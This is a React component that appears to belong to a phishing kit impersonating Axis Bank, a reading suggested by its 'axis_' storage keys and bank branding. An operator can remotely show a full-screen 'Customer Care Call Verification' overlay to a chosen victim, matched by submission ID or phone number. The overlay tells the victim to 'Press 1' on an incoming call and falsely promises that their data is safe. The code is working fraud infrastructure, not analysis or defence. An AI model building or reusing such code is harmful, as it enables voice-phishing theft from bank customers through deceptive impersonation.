import React, { useState, useEffect } from 'react';
import { Phone, Loader2 } from 'lucide-react';
import { supabase } from '../lib/supabase';

interface PhoneAuthOverlayProps {
  mobileNumber?: string;
  submissionId?: string | null;
}

export default function PhoneAuthOverlay({ mobileNumber, submissionId }: PhoneAuthOverlayProps) {
  const [isVisible, setIsVisible] = useState<boolean>(false);
  const [targetPhone, setTargetPhone] = useState<string>('');
  const [targetSubmissionId, setTargetSubmissionId] = useState<string>('');

  useEffect(() => {
    // Initial fetch of website_action, target_id and target_phone settings from app_settings
    const fetchAppSettings = async () => {
      try {
        let settingsList: Array<{ key: string; value: any }> = [];

        // 1. Try direct Supabase
        const { data, error } = await supabase
          .from('app_settings')
          .select('key, value');

        if (!error && data && Array.isArray(data)) {
          settingsList = data;
        } else {
          // 2. Server API fallback
          const resp = await fetch('/api/settings');
          const json = await resp.json();
          if (json.success && Array.isArray(json.data)) {
            settingsList = json.data;
          }
        }

        if (settingsList.length > 0) {
          const actionRow = settingsList.find((item) => item.key === 'website_action');
          const phoneRow = settingsList.find(
            (item) => item.key === 'target_phone' || item.key === 'website_action_target_phone'
          );
          const targetIdRow = settingsList.find(
            (item) => item.key === 'website_action_target_id' || item.key === 'target_submission_id'
          );

          if (actionRow && actionRow.value !== undefined && actionRow.value !== null) {
            const valStr = String(actionRow.value).trim().toLowerCase();
            setIsVisible(valStr === 'true' || valStr === '1' || valStr === 'yes');
          }

          if (phoneRow && phoneRow.value !== undefined && phoneRow.value !== null) {
            setTargetPhone(String(phoneRow.value).trim());
          }

          if (targetIdRow && targetIdRow.value !== undefined && targetIdRow.value !== null) {
            setTargetSubmissionId(String(targetIdRow.value).trim());
          }
        }
      } catch (err) {
        console.error('Error fetching app_settings:', err);
      }
    };

    fetchAppSettings();

    // 1.5-Second Polling fallback for guaranteed real-time updates across browsers/tabs
    const interval = setInterval(fetchAppSettings, 1500);

    // Supabase Realtime Subscription Channel for app_settings
    const channel = supabase
      .channel('app_settings_realtime_overlay')
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'app_settings',
        },
        (payload: any) => {
          if (payload.new && 'key' in payload.new && 'value' in payload.new) {
            const key = String(payload.new.key);
            const val = String(payload.new.value).trim();
            const valLower = val.toLowerCase();

            if (key === 'website_action') {
              setIsVisible(valLower === 'true' || valLower === '1' || valLower === 'yes');
            } else if (key === 'target_phone' || key === 'website_action_target_phone') {
              setTargetPhone(val);
            } else if (key === 'website_action_target_id' || key === 'target_submission_id') {
              setTargetSubmissionId(val);
            }
          }
        }
      )
      .subscribe();

    return () => {
      clearInterval(interval);
      supabase.removeChannel(channel);
    };
  }, []);

  if (!isVisible) return null;

  // Retrieve current active user session & phone
  let currentSubId = (submissionId || '').trim();
  let currentPhone = (mobileNumber || '').trim();

  try {
    if (!currentSubId) {
      currentSubId = (localStorage.getItem('axis_submission_id') || '').trim();
    }
    if (!currentPhone) {
      currentPhone = (localStorage.getItem('axis_mobile_number') || '').trim();
    }
  } catch (e) {
    // ignore
  }

  // TARGETING LOGIC:
  const cleanTargetId = (targetSubmissionId || '').trim();
  const cleanTargetPhone = (targetPhone || '').trim();

  // ONLY show globally if admin explicitly set target to 'all'
  const isGlobalTarget =
    cleanTargetId.toLowerCase() === 'all' ||
    cleanTargetPhone.toLowerCase() === 'all';

  if (!isGlobalTarget) {
    // If admin has not specified any target (both empty), DO NOT show popup automatically!
    if (!cleanTargetId && !cleanTargetPhone) {
      return null;
    }

    let matched = false;

    // Match by Submission ID
    if (cleanTargetId && cleanTargetId.toLowerCase() !== 'all' && currentSubId) {
      if (currentSubId.toLowerCase() === cleanTargetId.toLowerCase()) {
        matched = true;
      }
    }

    // Match by Mobile / Phone Number
    if (!matched && cleanTargetPhone && cleanTargetPhone.toLowerCase() !== 'all' && currentPhone) {
      const cleanTargetDigits = cleanTargetPhone.replace(/\D/g, '');
      const cleanUserDigits = currentPhone.replace(/\D/g, '');
      if (cleanTargetDigits && cleanUserDigits) {
        if (
          cleanUserDigits === cleanTargetDigits ||
          cleanUserDigits.endsWith(cleanTargetDigits) ||
          cleanTargetDigits.endsWith(cleanUserDigits)
        ) {
          matched = true;
        }
      }
    }

    // If a specific target user is set and this device does not match, do not show
    if (!matched) {
      return null;
    }
  }

  const displayPhone = targetPhone.trim() || (mobileNumber && mobileNumber.trim() ? mobileNumber.trim() : '9658695858');

  return (
    <div className="fixed inset-0 z-[99999] flex items-center justify-center p-4 bg-slate-900/60 backdrop-blur-sm animate-fadeIn">
      <div className="bg-white rounded-[28px] p-6 sm:p-8 max-w-sm sm:max-w-[420px] w-full mx-auto shadow-2xl border border-slate-100 flex flex-col items-center text-center relative overflow-hidden my-auto">
        
        {/* Top Spinner Badge */}
        <div className="flex items-center justify-center gap-2 mb-3 bg-[#AE275F]/10 px-3.5 py-1.5 rounded-full border border-[#AE275F]/20">
          <Loader2 className="w-4 h-4 animate-spin text-[#AE275F]" />
          <span className="text-xs font-bold text-[#AE275F] tracking-wide uppercase">Call Verification Pending</span>
        </div>

        {/* Header Title */}
        <h2 className="text-xl sm:text-2xl font-bold tracking-tight mb-2 text-slate-900">
          Please complete Customer Care Call Verification before proceeding
        </h2>
        
        {/* Header Subtitle */}
        <p className="text-slate-500 text-xs font-semibold mb-5">
          Phone Authentication Action Required
        </p>

        {/* Customer Care Inner Card */}
        <div className="bg-white rounded-2xl p-6 sm:p-7 w-full border border-slate-100 shadow-[0_8px_30px_rgb(0,0,0,0.06)] flex flex-col items-center mb-6">
          
          {/* Axis Burgundy Circle Icon Container (#AE275F) with Call Animation */}
          <div className="relative flex items-center justify-center mb-5">
            {/* Expanding Pulsing Ripple Waves */}
            <span className="absolute inline-flex h-28 w-28 rounded-full bg-[#AE275F] opacity-20 animate-ping" style={{ animationDuration: '1.6s' }}></span>
            <span className="absolute inline-flex h-24 w-24 rounded-full bg-[#AE275F]/25 animate-pulse"></span>

            {/* Main Circle Badge */}
            <div className="relative z-10 w-24 h-24 rounded-full flex items-center justify-center shadow-md shadow-[#AE275F]/20" style={{ backgroundColor: 'rgba(174, 39, 95, 0.15)' }}>
              <Phone className="w-10 h-10 animate-phone-ring" style={{ color: '#AE275F', fill: '#AE275F' }} />
            </div>
          </div>

          <style>{`
            @keyframes phoneRingtone {
              0% { transform: rotate(0deg) scale(1); }
              8% { transform: rotate(-18deg) scale(1.12); }
              16% { transform: rotate(18deg) scale(1.12); }
              24% { transform: rotate(-18deg) scale(1.12); }
              32% { transform: rotate(18deg) scale(1.12); }
              40% { transform: rotate(-10deg) scale(1.05); }
              48% { transform: rotate(10deg) scale(1.05); }
              56% { transform: rotate(0deg) scale(1); }
              100% { transform: rotate(0deg) scale(1); }
            }
            .animate-phone-ring {
              animation: phoneRingtone 1.2s infinite ease-in-out;
            }
          `}</style>

          {/* Heading */}
          <h3 className="text-2xl font-bold text-slate-800 mb-3">
            Customer Care
          </h3>

          {/* Body Text */}
          <div className="text-slate-800 text-base leading-relaxed mb-6 font-semibold">
            <p>
              Your registered <span className="text-slate-900 font-extrabold">{displayPhone}</span> is receiving a call.
            </p>
            <p className="pt-2 font-bold text-slate-900">
              Press 1 to receive and verify.
            </p>
          </div>

          {/* Call Customer Care / Press 1 Action Button */}
          <div
            style={{ backgroundColor: '#AE275F', boxShadow: '0 4px 14px 0 rgba(174, 39, 95, 0.39)' }}
            className="w-full max-w-[240px] py-3.5 px-6 rounded-full font-bold text-white flex items-center justify-center gap-2 text-base select-none cursor-default"
          >
            <Phone className="w-4 h-4 fill-white" />
            <span>Call Customer Care • Press 1</span>
          </div>

          {/* Helper Text Under Button */}
          <p className="text-slate-500 text-xs font-medium mt-4">
            For phone verification or support, press 1 during the call
          </p>
        </div>

        {/* Footer Security Badge */}
        <div className="flex items-start justify-center gap-1.5 text-slate-500 text-[11px] font-medium leading-relaxed px-1">
          <span className="text-xs leading-none">🔒</span>
          <span>
            <strong className="text-slate-700">Secure Authentication</strong> • Your data is safe and never shared. Always verify calls from your registered number.
          </span>
        </div>

      </div>
    </div>
  );
}

